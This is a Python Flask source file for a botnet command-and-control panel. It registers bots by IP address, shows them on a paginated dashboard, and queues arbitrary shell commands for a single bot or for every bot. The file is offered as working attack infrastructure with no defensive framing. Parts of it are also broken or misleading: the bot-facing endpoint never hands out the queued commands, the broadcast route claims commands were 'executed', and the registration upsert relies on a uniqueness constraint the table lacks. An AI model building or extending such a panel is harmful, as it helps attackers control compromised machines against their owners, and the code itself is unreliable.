from flask import Flask, render_template, request, jsonify
import sqlite3
import logging

app = Flask(__name__)

# Logging configuration
logging.basicConfig(level=logging.INFO)

# Initialize the database
def init_db():
    with sqlite3.connect('bots.db') as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS bots (
                id INTEGER PRIMARY KEY, 
                ip TEXT, 
                last_seen TEXT DEFAULT (datetime('now', 'localtime')),
                status TEXT DEFAULT 'active'
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY,
                bot_id INTEGER,
                command TEXT,
                timestamp TEXT DEFAULT (datetime('now', 'localtime'))
            )
        """)
        conn.commit()

# Helper function for database queries
def query_db(query, args=(), fetch_one=False):
    with sqlite3.connect('bots.db') as conn:
        cursor = conn.cursor()
        cursor.execute(query, args)
        if fetch_one:
            return cursor.fetchone()
        return cursor.fetchall()

# Route: Register Bot
@app.route('/register', methods=['POST'])
def register_bot():
    ip = request.remote_addr
    logging.info(f"Bot registered with IP: {ip}")
    with sqlite3.connect('bots.db') as conn:
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO bots (ip, last_seen) 
            VALUES (?, datetime('now'))
            ON CONFLICT(ip) DO UPDATE SET last_seen = datetime('now')
        """, (ip,))
        conn.commit()
    return "Registered"

# Route: Command Endpoint
@app.route('/command', methods=['GET'])
def command():
    return "echo Bot Active"

# Route: Dashboard UI with Pagination or All Bots
@app.route('/dashboard')
def dashboard():
    # Check if "all" parameter is present
    show_all = request.args.get('all', 'false') == 'true'

    if show_all:
        # Fetch all bots without pagination
        bots = query_db("SELECT * FROM bots ORDER BY last_seen DESC")
        total_bots = len(bots)
        page, limit = 1, total_bots  # For UI purposes
    else:
        # Paginated view
        page = int(request.args.get('page', 1))
        limit = int(request.args.get('limit', 10))
        offset = (page - 1) * limit
        bots = query_db("SELECT * FROM bots ORDER BY last_seen DESC LIMIT ? OFFSET ?", (limit, offset))
        total_bots = query_db("SELECT COUNT(*) FROM bots", fetch_one=True)[0]

    return render_template('dashboard.html', bots=bots, page=page, limit=limit, total_bots=total_bots, show_all=show_all)

# Route: Send Command to a Bot
@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    bot_id = data.get('bot_id')
    command = data.get('command')

    if not bot_id or not command:
        return jsonify({"status": "error", "message": "Invalid input"}), 400

    logging.info(f"Command sent to Bot {bot_id}: {command}")
    with sqlite3.connect('bots.db') as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT INTO commands (bot_id, command) VALUES (?, ?)", (bot_id, command))
        conn.commit()

    return jsonify({"status": "success", "bot_id": bot_id, "command": command})

# Route: Execute Command for All Bots
@app.route('/execute_all', methods=['POST'])
def execute_all():
    data = request.json
    command = data.get('command')

    if not command:
        return jsonify({"status": "error", "message": "Command is required"}), 400

    logging.info(f"Executing command for all bots: {command}")
    with sqlite3.connect('bots.db') as conn:
        cursor = conn.cursor()
        # Log the command for each bot in the database
        cursor.execute("SELECT id FROM bots")
        bot_ids = cursor.fetchall()
        for bot_id in bot_ids:
            cursor.execute("INSERT INTO commands (bot_id, command) VALUES (?, ?)", (bot_id[0], command))
        conn.commit()

    return jsonify({"status": "success", "message": f"Command '{command}' executed for all bots"})

# Route: Command History
@app.route('/command_history/<int:bot_id>')
def command_history(bot_id):
    commands = query_db("SELECT command, timestamp FROM commands WHERE bot_id = ? ORDER BY timestamp DESC", (bot_id,))
    return jsonify({"bot_id": bot_id, "commands": commands})

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5001)
